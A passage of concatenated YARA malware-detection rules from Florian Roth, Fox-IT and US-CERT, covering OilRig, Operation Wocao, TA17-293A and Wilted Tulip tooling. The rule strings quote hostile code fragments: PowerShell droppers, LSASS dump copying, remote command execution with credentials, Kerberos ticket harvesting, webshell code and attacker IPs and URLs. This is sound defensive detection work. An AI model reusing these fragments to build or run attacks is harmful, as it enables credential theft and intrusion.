      filesize < 800KB and 1 of them
}

/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-10-18
   Identifier: OilRig
   Reference: https://goo.gl/JQVfFP
*/

/* Rule Set ----------------------------------------------------------------- */

import "pe"

rule OilRig_ISMAgent_Campaign_Samples1 {
   meta:
      description = "Detects OilRig malware from Unit 42 report in October 2017"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://goo.gl/JQVfFP"
      date = "2017-10-18"
      hash1 = "119c64a8b35bd626b3ea5f630d533b2e0e7852a4c59694125ff08f9965b5f9cc"
      hash2 = "0ccb2117c34e3045a4d2c0d193f1963c8c0e8566617ed0a561546c932d1a5c0c"
   strings:
      $s1 = "###$$$TVqQAAMAAAAEAAAA" ascii
      $s2 = "C:\\Users\\J-Win-7-32-Vm\\Desktop\\error.jpg" fullword wide
      $s3 = "$DATA = [System.Convert]::FromBase64String([IO.File]::ReadAllText('%Base%'));[io.file]::WriteAllBytes(" ascii
      $s4 = " /c echo powershell > " fullword wide ascii
      $s5 = "\\Libraries\\servicereset.exe" fullword wide
      $s6 = "%DestFolder%" fullword wide ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 3000KB and 2 of them
}

rule OilRig_ISMAgent_Campaign_Samples2 {
   meta:
      description = "Detects OilRig malware from Unit 42 report in October 2017"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://goo.gl/JQVfFP"
      date = "2017-10-18"
      hash1 = "fcad263d0fe2b418db05f47d4036f0b42aaf201c9b91281dfdcb3201b298e4f4"
      hash2 = "33c187cfd9e3b68c3089c27ac64a519ccc951ccb3c74d75179c520f54f11f647"
   strings:
      $x1 = "PolicyConverter.exe" fullword wide
      $x2 = "SrvHealth.exe" fullword wide
      $x3 = "srvBS.txt" fullword wide

      $s1 = "{a3538ba3-5cf7-43f0-bc0e-9b53a98e1643}, PublicKeyToken=3e56350693f7355e" fullword wide
      $s2 = "C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\RegAsm.exe" fullword wide
   condition:
      uint16(0) == 0x5a4d and filesize < 700KB and ( 2 of ($x*) or 3 of them )
}
 
rule APT_MAL_CN_Wocao_Agent_Csharp {
    meta:
        description = "Strings from CSharp version of Agent"
        author = "Fox-IT SRT"
        reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"

    strings:
        $a = "mysend(client_sock, new byte[] { 0x16, 0x00 }, 2);" ascii wide
        $b = "Dns.GetHostAddresses(sip.Remove(sip.Length - 1));" ascii wide
        $c = "Port = 256 * buf[4] + buf[5];" ascii wide
        $d = "Port = 256 * buf[AddrLen] + buf[AddrLen + 1];" ascii wide
        $e = "StartTransData(CliSock" ascii wide
        $f = "static void ForwardTransmit(object ft_data)" ascii wide

        $key = "0x4c, 0x1b, 0x68, 0x0b, 0x6a, 0x18, 0x09, 0x41, 0x5a, 0x36, 0x1f, 0x56, 0x26, 0x2a, 0x03, 0x44, 0x7d, 0x5f, 0x03, 0x7b, 0x07, 0x6e, 0x03, 0x77, 0x30, 0x70, 0x52, 0x42, 0x53, 0x67, 0x0a, 0x2a" ascii wide
        $key_raw = { 4c1b680b6a1809415a361f56262a03447d5f037b076e03773070524253670a2a }

    condition:
        1 of them
}

rule APT_MAL_CN_Wocao_agent_powershell_dropper {
    meta:
        description = "Strings from PowerShell dropper of CSharp version of Agent"
        author = "Fox-IT SRT"
        reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"

    strings:
        $a = "function format([string]$source)"
        $b = "foreach($c in $bb){$tt = $tt + [char]($c -bxor"
        $c = "[agent]::Main($args);"

    condition:
        1 of them
}

rule APT_MAL_CN_Wocao_agent_powershell_b64encoded {
    meta:
        description = "Piece of Base64 encoded data from Agent CSharp version"
        author = "Fox-IT SRT"
        reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"

    strings:
        $header = "LFNVT0hBBnVfVVJDSx0sU1VPSEEGdV9VUkNLCG9pHSxTVU9IQQZ1X1VSQ0sIZUlK"

    condition:
        all of them
}

rule APT_MAL_CN_Wocao_agent_py {
    meta:
        description = "Strings from Python version of Agent"
        author = "Fox-IT SRT"
        reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"

    strings:
        $a = "vpshex.decode"
        $b = "self._newsock.recv"
        $c = "Rsock.connect"
        $d = /MAX_DATALEN\s?=\s?10240/
        $e = /LISTEN_MAXCOUNT\s?=\s?80/
        $f = "ListenSock.listen(LISTEN_MAXCOUNT)"
        $g = "nextsock.send(head)"
        $h = "elif transnode"
        $i = "infobuf[4:6]"

        $key = "L\\x1bh\\x0bj\\x18\\tAZ6\\x1fV&*\\x03D}_\\x03{\\x07n\\x03w0pRBSg\\n*"
    condition:
        1 of them
}

rule APT_MAL_CN_Wocao_agent_py_b64encoded {
    meta:
        description = "Piece of Base64 encoded data from Agent Python version"
        author = "Fox-IT SRT"
        reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"

    strings:
        $header = "QlpoOTFBWSZTWWDdHjgABDTfgHwQe////z/v/9+////6YA4cGPsAl2e8M9LSU128"

    condition:
        all of them
}

rule APT_MAL_CN_Wocao_keylogger_py {
    meta:
        description = "Strings from Python keylogger"
        author = "Fox-IT SRT"
        reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"

    strings:
        $a = "c:\\windows\\temp\\tap.tmp"
        $b = "c:\\windows\\temp\\mrteeh.tmp"
        $c = "GenFileName"
        $d = "outfile"
        $e = "[PASTE:%d]"

    condition:
        3 of them
}

rule APT_MAL_CN_Wocao_keylogger_file {
    meta:
        description = "Rule for finding keylogger output files"
        author = "Fox-IT SRT"
        reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"

    strings:
        $a = { 0d 0a 20 [3-10] 53 74 61 72 74 75 70 3a 20 [3] 20 [3] 20 [2] 20 [2] 3a [2] 3a [2] 20 }

    condition:
        all of them
}

rule APT_MAL_CN_Wocao_xserver_csharp {
    meta:
        description = "Strings from the CSharp version of XServer"
        author = "Fox-IT SRT"
        reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"

    strings:
        $a = "static void ServerX(int ListenPort)" ascii wide
        $b = "public class xserver" ascii wide
        $c = "[xserver]::Main($args);" ascii wide
        $d = "add rule name=powershell dir=in localport=47000 action=allow" ascii wide
        $e = "string TempFile = file_path + \".CT\";" ascii wide
        $f = "Port = 256 * RecvBuf[AddrLen + 5] + RecvBuf[AddrLen + 6];"
        $g = "CliSock.Send(new byte[] { 0x05, 0x00 });"

    condition:
        1 of them
}

rule APT_MAL_CN_Wocao_xserver_powershell_b64encoded {
    meta:
        description = "Piece of Base64 encoded data from the XServer PowerShell dropper"
        author = "Fox-IT SRT"
        reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"

    strings:
        $header_47000 = "5T39c9u2kr/nr2A0Ny2VKIzkfLRJntuJHafPN/nwWG777rUZDy3BNq8UqSEpx26b"
        $header_25667 = "5T1rc9u2st/zKxjNmZZKFEZyErdJ6nZsx+nxnTjxWGp77mkzHlqCbd5SpIak/Gjr"
    condition:
        any of them
}

rule APT_MAL_CN_Wocao_xserver_powershell_dropper {
    meta:
        description = "Strings from the PowerShell dropper of XServer"
        author = "Fox-IT SRT"
        reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"

    strings:
        $encfile = "New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($encfile)"
    condition:
        all of them
}

rule APT_MAL_CN_Wocao_injector_bin {
    meta:
        description = "Process injector/launcher"
        author = "Fox-IT SRT"
        reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"

    strings:
        $a = "%s{%04d-%02d%02d-%02d%02d-%d%ld}.tmp"
        $b = "s% > s% c/ exe.d"
        $c = {
            48 89 5C 24 08 48 89 74  24 10 57 48 83 EC 50 48
            8B 71 08 48 8D 59 10 48  8B F9 48 8B CB FF 17 33
            C9 48 8D 47 78 48 89 44  24 48 4C 8D 87 9C 03 00
            00 48 89 5C 24 40 48 8D  97 90 00 00 00 4C 89 44
            24 38 45 33 C9 48 89 4C  24 30 45 33 C0 89 4C 24
            28 C7 44 24 20 01 00 00  00 66 89 4B 40 FF D6 48
            8B 5C 24 60 33 C0 48 8B  74 24 68 48 83 C4 50 5F
            C3
        }

    condition:
        1 of them
}

rule APT_MAL_CN_Wocao_timeliner_bin {
    meta:
        description = "Timeliner utility"
        author = "Fox-IT SRT"
        reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"

    strings:
        $a = "[+] Work completed." ascii wide
        $b = "[-] Create a new file failed." ascii wide
        $c = "[-] This is not a correct path." ascii wide
        $d = "%s [TargetPath] <Num> <SavePath>" ascii wide
        $e = "D\t%ld\t%ld\t%ld\t%d\t%d\t%s\t" ascii wide
        $f = "D\t%ld\t%ld\t%ld\t-1\t%d\t%s\t" ascii wide
        $g = "%s\t%ld\t%ld\t%ld\t%I64d\t%d\t%s\t%s" ascii wide

    condition:
        1 of them
}

rule APT_MAL_CN_Wocao_checkadmin_bin {
    meta:
        description = "Checkadmin utility"
        author = "Fox-IT SRT"
        reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"

    strings:
        $a = "[-] %s * A system error has occurred: %d" ascii wide
        $b = {
            0D 00 0A 00 25 00 6C 00 64 00 20 00 72 00 65 00
            73 00 75 00 6C 00 74 00 73 00 2E 00 0D 00 0A 00
        }
        $c = "%s\t<Access denied>" ascii wide

    condition:
        1 of them
}

rule APT_MAL_CN_Wocao_getos_py {
    meta:
        description = "Python getos utility"
        author = "Fox-IT SRT"
        reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"

    strings:
        $smb_1 = {
            00 00 00 85 ff 53 4d 42 72 00 00 00 00 18 53 c8
            00 00 00 00 00 00 00 00 00 00 00 00 00 00 ff fe
            00 00 ff b4 00 62 00 02 50 43 20 4e 45 54 57 4f
            52 4b 20 50 52 4f 47 52 41 4d 20 31 2e 30 00 02
            4c 41 4e 4d 41 4e 31 2e 30 00 02 57 69 6e 64 6f
            77 73 20 66 6f 72 20 57 6f 72 6b 67 72 6f 75 70
            73 20 33 2e 31 61 00 02 4c 4d 31 2e 32 58 30 30
            32 00 02 4c 41 4e 4d 41 4e 32 2e 31 00 02 4e 54
            20 4c 4d 20 30 2e 31 32 00
        }
        $smb_2 = {
            00 00 00 c8 ff 53 4d 42 73 00 00 00 00 18 03 c8
            00 00 00 00 00 00 00 00 00 00 00 00 00 00 ff fe
            00 00 3f b5 0c ff 00 c8 00 04 11 32 00 00 00 00
            00 00 00 28 00 00 00 00 00 d4 00 00 a0 8d 00 4e
            54 4c 4d 53 53 50 00 01 00 00 00 07 82 88 a2 00
            00 00 00 28 00 00 00 00 00 00 00 28 00 00 00 05
            01 28 0a 00 00 00 0f 00 00 00 00 00 00 00 00 00
            00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
            00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
            00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
            00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
            00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
            00 00 00 00 00 00 00 00 00 00 00 00
        }
        $smbstr_1 = "\\x00\\x00\\x00\\x85\\xffSMBr\\x00\\x00\\x00\\x00\\x18S\\xc8\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xff\\xfe\\x00\\x00\\xff\\xb4\\x00b\\x00\\x02PC NETWORK PROGRAM 1.0\\x00\\x02LANMAN1.0\\x00\\x02Windows for Workgroups 3.1a\\x00\\x02LM1.2X002\\x00\\x02LANMAN2.1\\x00\\x02NT LM 0.12\\x00"
        $smbstr_2 = "\\x00\\x00\\x00\\xc8\\xffSMBs\\x00\\x00\\x00\\x00\\x18\\x03\\xc8\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xff\\xfe\\x00\\x00?\\xb5\\x0c\\xff\\x00\\xc8\\x00\\x04\\x112\\x00\\x00\\x00\\x00\\x00\\x00\\x00(\\x00\\x00\\x00\\x00\\x00\\xd4\\x00\\x00\\xa0\\x8d\\x00NTLMSSP\\x00\\x01\\x00\\x00\\x00\\x07\\x82\\x88\\xa2\\x00\\x00\\x00\\x00(\\x00\\x00\\x00\\x00\\x00\\x00\\x00(\\x00\\x00\\x00\\x05\\x01(\\n\\x00\\x00\\x00\\x0f\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00"

        $code_1 = "return 'Other error.'" ascii wide
        $code_2 = "sblob = buf[47:47 + sbl]" ascii wide
        $code_3 = "re.split('[\\x00-,]+', y[-4])" ascii wide
        $code_4 = "('').join(sblob[off:off + hlen].split('\\x00'))" ascii wide
        $code_5 = "banner = '%s    %s' % (hostname, native)" ascii wide
        $code_6 = "banner = '%s\\\\%s    %s' % (dm, hostname, native)" ascii wide

        $tsk_1 = "PushTask" ascii wide
        $tsk_2 = "parse_task" ascii wide
        $tsk_3 = "commit_task" ascii wide

        $str_1 = "Usage: getos.py <ip-range|ip-file>" ascii wide
        $str_2 = "The path '%s' write fails." ascii wide
        $str_3 = "Receive a signal %d," ascii wide
        $str_4 = "Scan Complete!" ascii wide
        $str_5 = "line: %d, %s: %s" ascii wide
        $str_6 = "Other error." ascii wide

    condition:
        (all of ($smb_*)) or
        (all of ($smbstr_*)) or
        (3 of ($code_*)) or
        (all of ($tsk_*)) or
        (3 of ($str_*))
}

rule APT_MAL_CN_Wocao_info_vbs {
    meta:
        description = "Strings from the information grabber VBS"
        author = "Fox-IT SRT"
        reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"

    strings:
        $ = "Logger PingConnect"
        $ = "Logger GetAdmins"
        $ = "Logger InstallPro"
        $ = "Logger Exec"
        $ = "retstr = adminsName & \" Members\" & vbCrLf & _"
        $ = "Logger VolumeName & \" (\" & objDrive.DriveLetter & \":)\" _"
        $ = "txtRes = txtRes & machine & \" can"
        $ = "retstr = \"PID   SID Image Name\" & vbCrLf & \"===="

    condition:
        4 of them
}

rule APT_MAL_CN_Wocao_webshell_console_jsp {
    meta:
        description = "Strings from the console.jsp webshell"
        author = "Fox-IT SRT"
        reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"

    strings:
        $a = "String strLogo = request.getParameter(\"image\")"
        $b = "!strLogo.equals(\"web.gif\")"
        $c = "<font color=red>Save Failed!</font>"
        $d = "<font color=red>Save Success!</font>"
        $e = "Save path:<br><input type=text"
        $f = "if (newfile.exists() && newfile.length()>0) { out.println"

    condition:
        1 of them
}

rule APT_MAL_CN_Wocao_webshell_index_jsp {
    meta:
        description = "Strings from the index.jsp socket tunnel"
        author = "Fox-IT SRT"
        reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"

    strings:
        $x1 = "X-CMD"
        $x2 = "X-STATUS"
        $x3 = "X-TARGET"
        $x4 = "X-ERROR"
        $a = "out.print(\"All seems fine.\");"

    condition:
        all of ($x*) and $a
}

rule APT_MAL_CN_Wocao_webshell_ver_jsp {
    meta:
        description = "Strings from the ver.jsp webshell"
        author = "Fox-IT SRT"
        reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"

    strings:
        $a = "String strLogo = request.getParameter(\"id\")"
        $b = "!strLogo.equals(\"256\")"
        $c = "boolean chkos = msg.startsWith"
        $d = "while((c = er.read()) != -1)"
        $e = "out.print((char)c);}in.close()"
        $f = "out.print((char)c);}er.close()"

    condition:
        1 of them
}

rule APT_MAL_CN_Wocao_webshell_webinfo {
    meta:
        description = "Generic strings from webinfo.war webshells"
        author = "Fox-IT SRT"
        reference = "https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/"

    strings:
        $var1 = "String strLogo = request.getParameter"
        $var2 = "String content = request.getParameter(\"content\");"
        $var3 = "String basePath=request.getScheme()"
        $var4 = "!strLogo.equals("
        $var5 = "if(path!=null && !path.equals(\"\") && content!=null"
        $var6 = "File newfile=new File(path);"

        $str1 = "Save Success!"
        $str2 = "Save Failed!"

    condition:
        2 of ($var*) or (all of ($str*) and 1 of ($var*))
}
/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2015-08-31
	Identifier: RWMC Powershell Credential Dumper
*/

rule Reveal_MemoryCredentials {
	meta:
		description = "Auto-generated rule - file Reveal-MemoryCredentials.ps1"
		license = "https://creativecommons.org/licenses/by-nc/4.0/"
		author = "Florian Roth"
		reference = "https://github.com/giMini/RWMC/"
		date = "2015-08-31"
		hash = "893c26818c424d0ff549c1fbfa11429f36eecd16ee69330c442c59a82ce6adea"
	strings:
		$s1 = "$dumpAProcessPath = \"C:\\Windows\\temp\\msdsc.exe\"" fullword ascii
		$s2 = "$user = Get-ADUser -Filter {UserPrincipalName -like $loginPlainText -or sAMAccountName -like $loginPlainText}" fullword ascii
		$s3 = "Copy-Item -Path \"\\\\$computername\\\\c$\\windows\\temp\\lsass.dmp\" -Destination \"$logDirectoryPath\"" fullword ascii
		$s4 = "if($backupOperatorsFlag -eq \"true\") {$loginPlainText = $loginPlainText + \" = Backup Operators\"}            " fullword ascii
	condition:
		filesize < 200KB and 1 of them
}

rule MiniDumpTest_msdsc {
	meta:
		description = "Auto-generated rule - file msdsc.exe"
		license = "https://creativecommons.org/licenses/by-nc/4.0/"
		author = "Florian Roth"
		reference = "https://github.com/giMini/RWMC/"
		date = "2015-08-31"
		hash = "477034933918c433f521ba63d2df6a27cc40a5833a78497c11fb0994d2fd46ba"
	strings:
		$s1 = "MiniDumpTest1.exe" fullword wide
		$s2 = "MiniDumpWithTokenInformation" fullword ascii
		$s3 = "MiniDumpTest1" fullword wide
		$s6 = "Microsoft 2008" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 20KB and all of them
}

/*
   Yara Rule Set
   Author: US-CERT
   Date: 2017-10-21
   Identifier: TA17-293A
   Reference: https://www.us-cert.gov/ncas/alerts/TA17-293A

   Beware: Rules have been modified to reduce complexity and false positives as well as to
           improve the overall performance
*/

import "pe"

rule TA17_293A_malware_1 {
    meta:
        description = "inveigh pen testing tools & related artifacts"
        author = "US-CERT Code Analysis Team (modified by Florian Roth)"
        reference = "https://www.us-cert.gov/ncas/alerts/TA17-293A"
        date = "2017/07/17"
        hash0 = "61C909D2F625223DB2FB858BBDF42A76"
        hash1 = "A07AA521E7CAFB360294E56969EDA5D6"
        hash2 = "BA756DD64C1147515BA2298B6A760260"
        hash3 = "8943E71A8C73B5E343AA9D2E19002373"
        hash4 = "04738CA02F59A5CD394998A99FCD9613"
        hash5 = "038A97B4E2F37F34B255F0643E49FC9D"
        hash6 = "65A1A73253F04354886F375B59550B46"
        hash7 = "AA905A3508D9309A93AD5C0EC26EBC9B"
        hash8 = "5DBEF7BDDAF50624E840CCBCE2816594"
        hash9 = "722154A36F32BA10E98020A8AD758A7A"
        hash10 = "4595DBE00A538DF127E0079294C87DA0"
    strings:
        $n1 = "file://"

        $ax1 = "184.154.150.66"
        $ax2 = "5.153.58.45"
        $ax3 = "62.8.193.206"
        $ax4 = "/pshare1/icon"
        $ax5 = "/ame_icon.png"
        $ax6 = "/1/ree_stat/p"

        /* Too many false positives with these strings
        $au1 = "/icon.png"
        $au2 = "/notepad.png"
        $au3 = "/pic.png"
        */

        $s1 = "(g.charCodeAt(c)^l[(l[b]+l[e])%256])"
        $s2 = "for(b=0;256>b;b++)k[b]=b;for(b=0;256>b;b++)"
        $s3 = "VXNESWJfSjY3grKEkEkRuZeSvkE="
        $s4 = "NlZzSZk="
        $s5 = "WlJTb1q5kaxqZaRnser3sw=="

        $x1 = { 87D081F60C67F5086A003315D49A4000F7D6E8EB12000081F7F01BDD21F7DE }
        $x2 = { 33C42BCB333DC0AD400043C1C61A33C3F7DE33F042C705B5AC400026AF2102 }
        $x3 = "fromCharCode(d.charCodeAt(e)^k[(k[b]+k[h])%256])"
        $x4 = "ps.exe -accepteula \\%ws% -u %user% -p %pass% -s cmd /c netstat"
        $x5 = { 22546F6B656E733D312064656C696D733D5C5C222025254920494E20286C6973742E74787429 }
        $x6 = { 68656C6C2E657865202D6E6F65786974202D657865637574696F6E706F6C69637920627970617373202D636F6D6D616E6420222E202E5C496E76656967682E70 }
        $x7 = { 476F206275696C642049443A202266626433373937623163313465306531 }
        $x8 = { 24696E76656967682E7374617475735F71756575652E4164642822507265737320616E79206B657920746F2073746F70207265616C2074696D65 }
        //specific malicious word document PK archive
        $x9 = { 2F73657474696E67732E786D6CB456616FDB3613FEFE02EF7F10F4798E64C54D06A14ED125F19A225E87C9FD0194485B }
        $x10 = { 6C732F73657474696E67732E786D6C2E72656C7355540500010076A41275780B0001040000000004000000008D90B94E03311086EBF014D6F4D87B48214471D2 }
        $x11 = { 8D90B94E03311086EBF014D6F4D87B48214471D210A41450A0E50146EBD943F8923D41C9DBE3A54A240ACA394A240ACA39 }
        $x12 = { 8C90CD4EEB301085D7BD4F61CDFEDA092150A1BADD005217B040E10146F124B1F09FEC01B56F8FC3AA9558B0B4 }
        $x13 = { 8C90CD4EEB301085D7BD4F61CDFEDA092150A1BADD005217B040E10146F124B1F09FEC01B56F8FC3AA9558B0B4 }

        $x14 = "http://bit.ly/2m0x8IH"

    condition:
        ( $n1 and 1 of ($ax*) ) or
        2 of ($s*) or
        1 of ($x*)
}

rule TA17_293A_energetic_bear_api_hashing_tool {
   meta:
      description = "Energetic Bear API Hashing Tool"
      assoc_report = "DHS Report TA17-293A"
      author = "CERT RE Team"
      version = "2"
   strings:
      $api_hash_func_v1 = { 8A 08 84 C9 74 ?? 80 C9 60 01 CB C1 E3 01 03 45 10 EB ED }
      $api_hash_func_v2 = { 8A 08 84 C9 74 ?? 80 C9 60 01 CB C1 E3 01 03 44 24 14 EB EC }
      $api_hash_func_x64 = { 8A 08 84 C9 74 ?? 80 C9 60 48 01 CB 48 C1 E3 01 48 03 45 20 EB EA }

      $http_push = "X-mode: push" nocase
      $http_pop = "X-mode: pop" nocase
   condition:
      $api_hash_func_v1 or $api_hash_func_v2 or $api_hash_func_x64 and (uint16(0) == 0x5a4d or $http_push or $http_pop)
}

rule TA17_293A_Query_XML_Code_MAL_DOC_PT_2 {
    meta:
        name= "Query_XML_Code_MAL_DOC_PT_2"
        author = "other (modified by Florian Roth)"
        reference = "https://www.us-cert.gov/ncas/alerts/TA17-293A"
    strings:
        $dir1 = "word/_rels/settings.xml.rels"
        $bytes = {8c 90 cd 4e eb 30 10 85 d7}
    condition:
        uint32(0) == 0x04034b50 and $dir1 and $bytes
}

rule TA17_293A_Query_XML_Code_MAL_DOC {
    meta:
        name= "Query_XML_Code_MAL_DOC"
        author = "other (modified by Florian Roth)"
        reference = "https://www.us-cert.gov/ncas/alerts/TA17-293A"
    strings:
        $dir = "word/_rels/" ascii
        $dir2 = "word/theme/theme1.xml" ascii
        $style = "word/styles.xml" ascii
    condition:
        uint32(0) == 0x04034b50 and $dir at 0x0145 and $dir2 at 0x02b7 and $style at 0x08fd
}

rule TA17_293A_Query_Javascript_Decode_Function {
    meta:
        name= "Query_Javascript_Decode_Function"
        author = "other (modified by Florian Roth)"
        reference = "https://www.us-cert.gov/ncas/alerts/TA17-293A"
    strings:
        $decode1 = {72 65 70 6C 61 63 65 28 2F 5B 5E 41 2D 5A 61 2D 7A 30 2D 39 5C 2B 5C 2F 5C 3D 5D 2F 67 2C 22 22 29 3B}
        $decode2 = {22 41 42 43 44 45 46 47 48 49 4A 4B 4C 4D 4E 4F 50 51 52 53 54 55 56 57 58 59 5A 61 62 63 64 65 66 67 68 69 6A 6B 6C 6D 6E 6F 70 71 72 73 74 75 76 77 78 79 7A 30 31 32 33 34 35 36 37 38 39 2B 2F 3D 22 2E 69 6E 64 65 78 4F 66 28 ?? 2E 63 68 61 72 41 74 28 ?? 2B 2B 29 29}
        $decode3 = {3D ?? 3C 3C 32 7C ?? 3E 3E 34 2C ?? 3D 28 ?? 26 31 35 29 3C 3C 34 7C ?? 3E 3E 32 2C ?? 3D 28 ?? 26 33 29 3C 3C 36 7C ?? 2C ?? 2B 3D [1-2] 53 74 72 69 6E 67 2E 66 72 6F 6D 43 68 61 72 43 6F 64 65 28 ?? 29 2C 36 34 21 3D ?? 26 26 28 ?? 2B 3D 53 74 72 69 6E 67 2E 66 72 6F 6D 43 68 61 72 43 6F 64 65 28 ?? 29}
        $decode4 = {73 75 62 73 74 72 69 6E 67 28 34 2C ?? 2E 6C 65 6E 67 74 68 29}
        /* Only 3 characters atom - this is bad for performance - we're trying to leave this out
        $func_call="a(\""
        */
    condition:
        filesize < 20KB and
        /* #func_call > 20 and */
        all of ($decode*)
}

/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-10-21
   Identifier: TA17-293A Extensions
   Reference: https://www.us-cert.gov/ncas/alerts/TA17-293A
*/

/* Rule Set ----------------------------------------------------------------- */

rule TA17_293A_Hacktool_PS_1 {
   meta:
      description = "Auto-generated rule"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://www.us-cert.gov/ncas/alerts/TA17-293A"
      date = "2017-10-21"
      hash1 = "72a28efb6e32e653b656ca32ccd44b3111145a695f6f6161965deebbdc437076"
   strings:
      $x1 = "$HashFormat = '$krb5tgs$23$*ID#124_DISTINGUISHED NAME: CN=fakesvc,OU=Service,OU=Accounts,OU=EnterpriseObjects,DC=asdf,DC=pd,DC=f" ascii
      $x2 = "} | Where-Object {$_.SamAccountName -notmatch 'krbtgt'} | Get-SPNTicket @GetSPNTicketArguments" fullword ascii
   condition:
      ( filesize < 80KB and 1 of them )
}

rule TA17_293A_Hacktool_Touch_MAC_modification {
   meta:
      description = "Auto-generated rule"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://www.us-cert.gov/ncas/alerts/TA17-293A"
      date = "2017-10-21"
      hash1 = "070d7082a5abe1112615877214ec82241fd17e5bd465e24d794a470f699af88e"
   strings:
      $s1 = "-t time - use the time specified to update the access and modification times" fullword ascii
      $s2 = "Failed to set file times for %s. Error: %x" fullword ascii
      $s3 = "touch [-acm][ -r ref_file | -t time] file..." fullword ascii
      $s4 = "-m - change the modification time only" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 100KB and 1 of them )
}

rule TA17_293A_Hacktool_Exploit_MS16_032 {
   meta:
      description = "Auto-generated rule"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://www.us-cert.gov/ncas/alerts/TA17-293A"
      date = "2017-10-21"
      hash1 = "9b97290300abb68fb48480718e6318ee2cdd4f099aa6438010fb2f44803e0b58"
   strings:
      $x1 = "[?] Thread belongs to: $($(Get-Process -PID $([Kernel32]::GetProcessIdOfThread($Thread)))" ascii
      $x2 = "0x00000002, \"C:\\Windows\\System32\\cmd.exe\", \"\"," fullword ascii
      $x3 = "PowerShell implementation of MS16-032. The exploit targets all vulnerable" fullword ascii
      $x4 = "If we can't open the process token it's a SYSTEM shell!" fullword ascii
   condition:
      ( filesize < 40KB and 1 of them )
}
  
/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-07-23
   Identifier: Operation Wilted Tulip
   Reference: http://www.clearskysec.com/tulip
*/

import "pe"

/* Rule Set ----------------------------------------------------------------- */

rule WiltedTulip_Tools_back {
   meta:
      description = "Detects Chrome password dumper used in Operation Wilted Tulip"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "http://www.clearskysec.com/tulip"
      date = "2017-07-23"
      hash1 = "b7faeaa6163e05ad33b310a8fdc696ccf1660c425fa2a962c3909eada5f2c265"
   strings:
      $x1 = "%s.exe -f \"C:\\Users\\Admin\\Google\\Chrome\\TestProfile\" -o \"c:\\passlist.txt\"" fullword ascii
      $x2 = "\\ChromePasswordDump\\Release\\FireMaster.pdb" fullword ascii
